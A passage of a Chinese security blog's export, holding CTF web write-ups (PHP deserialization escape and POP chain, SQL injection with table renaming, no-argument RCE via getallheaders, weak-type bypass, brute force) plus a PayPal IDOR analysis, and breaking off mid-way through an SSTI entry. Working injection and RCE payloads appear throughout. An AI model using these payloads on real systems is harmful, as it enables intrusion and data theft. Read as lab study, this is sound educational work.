<p>对于这个 API, 他通过之前上面的 API 发现第一个 <code>id</code> 参数值是企业账号的 id, 他很快就能确定第二个 <code>id</code> 是子账号的 id 了, 在这里第二个 <code>id</code> 的内容是简单的数值类型, 而且这个 <code>id</code> 是简单的递增或递减的, 是完全可以通过<strong>枚举</strong>的方式来获取到其他账号的 id 的,  将 <code>5994224506</code> 修改成 <code>5994224507</code> 就可以获取到同一企业账号其他子账号的权限了.</p>
<h2 id="漏洞实施"><a href="#漏洞实施" class="headerlink" title="漏洞实施"></a>漏洞实施</h2><p>攻击者根据上述漏洞, 不仅可以查看到关联的另一个子账号的信息, 还可以把响应的子账号密码进行修改就可以实现账号接管并且进行任意未授权的转账操作.</p>
<h2 id="漏洞启示"><a href="#漏洞启示" class="headerlink" title="漏洞启示"></a>漏洞启示</h2><p>Paypal 这个漏洞的产生有两个主要原因:</p>
<ol>
<li>子账号的 id 值可以通过枚举进行猜测</li>
<li>一但获取到 id 权限可以被扩大, 后续的转账操作没有二次对密码等进行确认</li>
</ol>
<p>预防这种漏洞, 在开发过程中需要留意:</p>
<ol>
<li>增强 id 值的随机性</li>
<li>在权限访问控制上, 要多次检验企业账号与子账号的绑定关系, 如每次访问涉及子账号权限的操作时, 要求其输入密码,或者输入绑定号等.</li>
</ol>
]]></content>
      <categories>
        <category>API安全</category>
        <category>漏洞剖析</category>
      </categories>
      <tags>
        <tag>API 安全</tag>
        <tag>IDOR</tag>
      </tags>
  </entry>
  <entry>
    <title>【月饼杯】Serialize - str_replace字符逃逸</title>
    <url>/2023/10/08/Serialize-%E6%B3%A8%E5%85%A5-str-replace%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Serialize-注入-str-replace漏洞利用"><a href="#Serialize-注入-str-replace漏洞利用" class="headerlink" title="Serialize 注入 - str_replace漏洞利用"></a>Serialize 注入 - str_replace漏洞利用</h1><p>题目来自月饼杯 web1_此夜圆<br>题目代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span></span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__construct</span>(<span class="params">$uname,$password</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">if</span>($this-&gt;password===<span class="string">&#x27;yu22x&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                echo <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">filter</span>(<span class="params">$string</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">str_replace</span>(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=<span class="title function_">filter</span>(<span class="title function_">serialize</span>(<span class="keyword">new</span> <span class="title function_">a</span>($uname,$password)));</span><br><span class="line">$test=<span class="title function_">unserialize</span>($ser);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里我们发现__wakeup()函数里才有获取到 flag 的函数，不能绕过，这里只有一个 GET 修改 uname，说明就是要在 serialize 里覆盖 password 来获取到 flag。<br>看到有一个 filter 函数会套在 serialize 函数外面，这种格式会导致序列化后字符个数不匹配，在反序列化过程中，他会按照字符个数去匹配参数内容，如果不匹配那么 wakeup 函数就会失效，该参数也会清空，这里每出现一个Firebasky就会多两个字符，这样的话就允许我们模仿序列化后的格式去定义 password 来覆盖掉后面的 password，构造 password 会多下面这一部分。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>这里记得用 <strong>;}”</strong> 来结束结构，让后面的 password 无效。<br>一共多了 30 个字符，刚好是偶数，我们在 uname 里填入 15 个Firebasky，多出来的 15 个 up 就刚刚好把这部分掩盖掉，故构造 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; </span><br></pre></td></tr></table></figure>
<p>即可获得 flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>字符逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>about</title>
    <url>/2023/09/15/about/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="关于博客"><a href="#关于博客" class="headerlink" title="关于博客"></a>关于博客</h2><p>这是一个用于记录学习笔记的博客，包括日常学习和练习题，比赛赛题的 WriteUp。</p>
<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>中山大学软件工程学院学生&#x2F;CTFer Web 方向&#x2F;音游玩家<br>我的 QQ：1789697833<br>欢迎来找我玩！</p>
]]></content>
  </entry>
  <entry>
    <title>【攻防世界】simplePHP PHP代码审计</title>
    <url>/2023/09/16/artical-simplephp/</url>
    <content><![CDATA[<h3 id="EASY-PHP漏洞"><a href="#EASY-PHP漏洞" class="headerlink" title="EASY　PHP漏洞"></a>EASY　PHP漏洞</h3><p>打开 simplephp 这道题我们拿到的信息。<br><img src="/2023/09/16/artical-simplephp/image_question.jpg"><br>首先是可以看到代码中有两个 GET，说明这道题可以通过构造 url GET请求来渗透。<br>代码中出现了”&#x3D;&#x3D;”，这个在 php 中是弱类型比较，弱类型比较与“&#x3D;&#x3D;&#x3D;”不同，不会要求他们格式也相同，而是会先将两个不同格式的变量转换为相同格式再比较，对于“$a&#x3D;&#x3D;0&amp;&amp;a”我们可以通过构造 0 的 url 编码来绕过，首先 GET 请求的时候会先一次解码，所以这里的 0 我们要二次编码，编码成%2530，然后在&#x3D;&#x3D;这里会转换成 0 通过，在判 a 为真这里也会通过，因为不会转换类型。<br>对于 b 的构造，要求其大于 1234，首先先来了解 php 中的各类型转换：<br>string -&gt; int，会扔掉除了 int 类型以外的所有符号，在 php 比较里面也是这样，比如拿字符串和 int 类型做比较，会导致字符串类型过滤掉除了 int 以外的，所以不能比较 ascii 码。<br>以此类推，会转换成被对比对象的格式，其他格式一律清除。<br>php 代码：<br><img src="/2023/09/16/artical-simplephp/image_code.jpg"><br>结果：<br><img src="/2023/09/16/artical-simplephp/image_result.jpg"><br>所以在这里，b 那边有个判断是否是数字类型的函数，我们需要绕过这个函数，所以必须是字符串形式，又要要求大于 1234，于是我们构造 b&#x3D;1235a （前面的数字比 1234 大）即可。<br>对于此题，我们构造：<br>&#x2F;?a&#x3D;a&#x3D;%2530&amp;&amp;b&#x3D;%34%34%34%34%41 即可获得 flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】weak_auth 密码爆破</title>
    <url>/2023/09/18/easy-blast/</url>
    <content><![CDATA[<h3 id="简单密码爆破"><a href="#简单密码爆破" class="headerlink" title="简单密码爆破"></a>简单密码爆破</h3><p>打开题目后，看到一个登录页面.<br><img src="/2023/09/18/easy-blast/image1.jpg"><br>我们先随机输入一些东西进去，看看效果：<br><img src="/2023/09/18/easy-blast/image2.jpg"><br>看到 login as admin，我们将用户名改为 admin 后，发现弹出窗口不一样。于是就锁定了用户名是 admin，然后对密码进行爆破。<br>使用 burp 进行爆破，选用爆破字典，更改参数：<br><img src="/2023/09/18/easy-blast/image3.jpg"><br><img src="/2023/09/18/easy-blast/image4.jpg"><br>进行爆破后我们发现，密码“123456”获取到的响应包的长度显著不同，点开查看后，发现已经成功登录并获取到 flag。<br><img src="/2023/09/18/easy-blast/image5.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】mysql 注入 1</title>
    <url>/2023/09/19/mysql-inject1/</url>
    <content><![CDATA[<h3 id="SQL注入-更改表"><a href="#SQL注入-更改表" class="headerlink" title="SQL注入-更改表"></a>SQL注入-更改表</h3><p>打开题目，我们看到：<br><img src="/2023/09/19/mysql-inject1/image1.jpg"><br>猜测是考察 sql 注入，我们输入1’查看是否有注入机会：<br><img src="/2023/09/19/mysql-inject1/image2.jpg"><br>可以看到成功执行了，所以我们要查看能在这个数据库中获取到什么信息，执行语句：<br>“1’;show tables #”<br>这里的用单引号将查询语句结束，并用#注释掉后面的引号防止报错，这里的 show databases 就会执行了。<br><img src="/2023/09/19/mysql-inject1/image3.jpg"><br>可以看到两个表，”1919810931114514”和“words”，我们先试一下能不能直接查询表，使用：<br>“1’;select * from `1919810931114514` # 发现：<br><img src="/2023/09/19/mysql-inject1/image4.jpg"><br>禁用了以上语句，那我们就要想办法怎么拿到信息了，我们看到窗口有一个功能，这个功能多半是查询语句构造1’ or 1&#x3D;1 #查询表内所有内容，没有发现 flag，说明不在这个表，这代表我们要替换表，构造：<br>“1’;show columns from `1919810931114514` #<br>发现了 flag：<br><img src="/2023/09/19/mysql-inject1/image5.jpg"><br>那说明这个查询语句默认在表 word 里，题目似乎没有禁用 rename 和 alter，我们采取更改预设表的形式来获取 flag，构造：<br>1’; rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;<br>alter tables `words` change `flag` `id` varchar(100); #<br>去更改flag 在的表，并按照根据id 的格式去更改 flag，让查询语句对 flag 生效，更改后，构造：<br>1’ or 1&#x3D;1 #<br>查询所有内容即可获取到 flag。<br><img src="/2023/09/19/mysql-inject1/image6.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL 注入</tag>
      </tags>
  </entry>
  <entry>
    <title>【newstarctf2023】 无参数 rce</title>
    <url>/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/</url>
    <content><![CDATA[<h1 id="【newstarctf】-R-C-E-无参数-RCE"><a href="#【newstarctf】-R-C-E-无参数-RCE" class="headerlink" title="【newstarctf】 R!!C!!E!!  无参数 RCE"></a>【newstarctf】 R!!C!!E!!  无参数 RCE</h1><p>打开靶机，提示我们再找信息，dirsearch一下发现有 git 泄露，url请求该 path 拿到 git 文件，放到 cyberchef 里解密看到有其他的 php 文件，打开后看到源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显是一道 RCE 题，这边要绕正则，第一个正则是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])</span><br></pre></td></tr></table></figure>

<p>这是一个很经典的无参正则，他可以匹配</p>
<ul>
<li>func();</li>
<li>func(func2());</li>
<li>func(func2(func3()));</li>
<li>func1(func2($_POST[a]));  这个自己发现的，没准什么时候能用上</li>
</ul>
<p>然后就导致后面 preg＿match 不能绕过，只能选 preg＿match 过滤以外的无参数 RCE。</p>
<p>注意到这里没有限制getallheaders(),getallheaders()是一个无参获取所有请求头内容的函数，返回请求头数组，然后 next 也没有禁用，经检查发现他没有验证请求头完整性，我们就删掉其他参数只剩下 next 能检测到的参数就能从 header 获取 RCE 内容了。</p>
<p>故构造 payload 为：</p>
<pre><code>?star=eval(next(getallheaders()));
</code></pre>
<p>请求头里将Cache-Control字段的值改为：</p>
<pre><code>system(&#39;cat /f*&#39;);
</code></pre>
<p>即可获取 flag</p>
<p><img src="/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/result.jpg"></p>
<p>官方题解构造的 payload 是：</p>
<pre><code>?star=eval(pos(array_reverse(getallheaders())));
</code></pre>
<p>她们的思路是反转 header 数组再定位当前元素获取命令，命令放在请求头数组最后的元素上。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>无参数绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>【newstarctf2023】Fast Destruct</title>
    <url>/2023/10/31/newstarctf2023-fast-destruct/</url>
    <content><![CDATA[<h1 id="【newstarctf】-More-Fast-pop-链构造"><a href="#【newstarctf】-More-Fast-pop-链构造" class="headerlink" title="【newstarctf】 More Fast pop 链构造"></a>【newstarctf】 More Fast pop 链构造</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br></pre></td></tr></table></figure>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>看到题目，在 Web 这个类里面才能 RCE，也就是说最后的 POP<br> 链要在 Web 结束，往前推发现 Pwn 类里有 evil 说明是由 Pwn 类到 Web 类。</p>
<p> 触发 Pwn 类的__invoke()需要将 Pwn 类作为函数调用，可以看到Reverse类满足要求，所以是 Reverse 类到 Pwn 类。</p>
<p> Reverse类的 __get()方法需要访问一个不存在的属性，可以看到Crypto类满足条件，所以是Crypto类到 Reverse 类。</p>
<p> Crypto 类的__toString()在Start类的 die 函数中可以触发，说明是 Start 类到 Crypto 类。</p>
<p> 所以这道题的 POP 链构造为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Start::__destruct -&gt; Crypto::__toString -&gt; Reverse::__get -&gt; Pwn::__invoke -&gt; Web::evil</span><br></pre></td></tr></table></figure>

<p>POP链构造很容易，构造 POP 链的代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;errMsg = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&quot;fla&#x27;&#x27;g&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要是如何将 Start 类的 __destruct 作为入口触发。这里要介绍一下 fast destruct 技术：</p>
<ul>
<li>在 php 中，如果单独执行 unserialize 函数进行反序列化，那么反序列化后的对象的生命周期就会仅限于 unserialize 函数执行的生命周期，unserialize函数执行完毕，这个类就销毁了，此时就会调用 destruct。</li>
<li>如果将 unserialize 反序列化后的对象赋值给另一个变量，那么该对象的生命周期就会延长至该变量销毁为止。</li>
<li>unserialize 过程中是逐字读取的，他会先把读取到的内容分配内存空间，在结束的时候统一调用。</li>
</ul>
<p>以上三条意味着我们可以修改反序列化字符串的结构，当 unserialize 读到不正确的结构时会直接强制退出，这时 unserialize 执行结束，类销毁，会调用 destruct，对于已经分配好内存空间的类来说，就是提前调用了 destruct 。</p>
<p>fast destruct有两种方法：<br>序列化好后的结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>修改序列化数字元素个数(O:5 -&gt; O:6)：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>去掉序列化尾部 }:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;</span><br></pre></td></tr></table></figure>

<p>通过这两种方法均可拿到 flag：</p>
<p><img src="/2023/10/31/newstarctf2023-fast-destruct/pop.jpg"></p>
<h2 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h2><p>官方题解给出了一个基于 GC 垃圾回收机制的绕过，PHP中 有垃圾回收机制，当触发垃圾回收机制时，则会自动调用 destruct 函数，触发垃圾回收机制的方法有：</p>
<ul>
<li>源码中有 unset() 函数，可以直接销毁对象</li>
<li>当给对象赋值为 NULL 时，可以触发</li>
<li>当对象失去引用时，可以触发</li>
</ul>
<p>官方的题解中，通过修改下标的方式，让已经分配好内存的对象失去引用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>] = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:0&quot;</span>,<span class="string">&quot;i:1&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fl&#x27;&#x27;ag&quot;;&#125;&#125;&#125;&#125;&#125;i:1;N;&#125;</span><br></pre></td></tr></table></figure>

<p>这里 i:1 在后面会再次声明，前面那个对象失去引用，所以就出发了 destruct，这种方式可以绕过抛出异常，应用范围更广一些。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>pop 链</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】 easy_python 模板注入1</title>
    <url>/2023/09/18/python-template1/</url>
    <content><![CDATA[<h3 id="Python-模板注入"><a href="#Python-模板注入" class="headerlink" title="Python 模板注入"></a>Python 模板注入</h3><p>拿到题目，直接告诉我们是 python template 问题，以 python 模板注入的角度切入。<br>对于很多网站，为了方便，都会套用一个 html 模板，模板会给一个接口，用 python 将这段代码以作为变量的形式套入进模板。<br>这里的模板注入就是，我们可以在这个变量里面注入我们想要的代码，获取到信息，注入的时候用花括号“{ {} }”包裹住 code。本题中，我们测试{ {1+5} }：<br><img src="/2023/09/18/python-template1/image1.jpg"><br>果不其然，代码执行了，返回了 6，接下来进行正式的注入，常见的注入方法有以下几种：<br>以下所有的方法均要被“__” 包裹</p>
<ul>
<li>__class__ ： 返回对象所属的类。</li>
<li>__mro__ : 返回基类元组。</li>
<li>__base__：返回基类。</li>
<li>__subclasses__()[]：返回子类。</li>
<li>__init__ ：初始化类。</li>
<li>__globals[]__ ： 对包含函数全局变量的字典的引用，说人话就是调用全局的包，如’os’等。</li>
</ul>
<p>在注入之后我们通常使用两种方法来操控控制台获取信息：</p>
<ul>
<li>os.popen(“file_name”) ：返回文件内容。</li>
<li>os.system ： 返回状态码。</li>
</ul>
<p>开始操作，构造 [].__class__.__mro__ 并发送：<br><img src="/2023/09/18/python-template1/image2.jpg"><br>可以看到获取到了两个基类，我们选用 mro[1] 获取其中一个基类，然后再在这个基类里面调取他所有可用的子类，构造 [].__class__.__mro__[1].__subclasses__() 发送，获取到所有子类：<br><img src="/2023/09/18/python-template1/image3.jpg"><br>我们要找到 os.popen 的基类site._Printer类，用它来调用 popen，对此，我们先要找到 site._Printer在subclasses 中的索引，调用以下代码：</p>
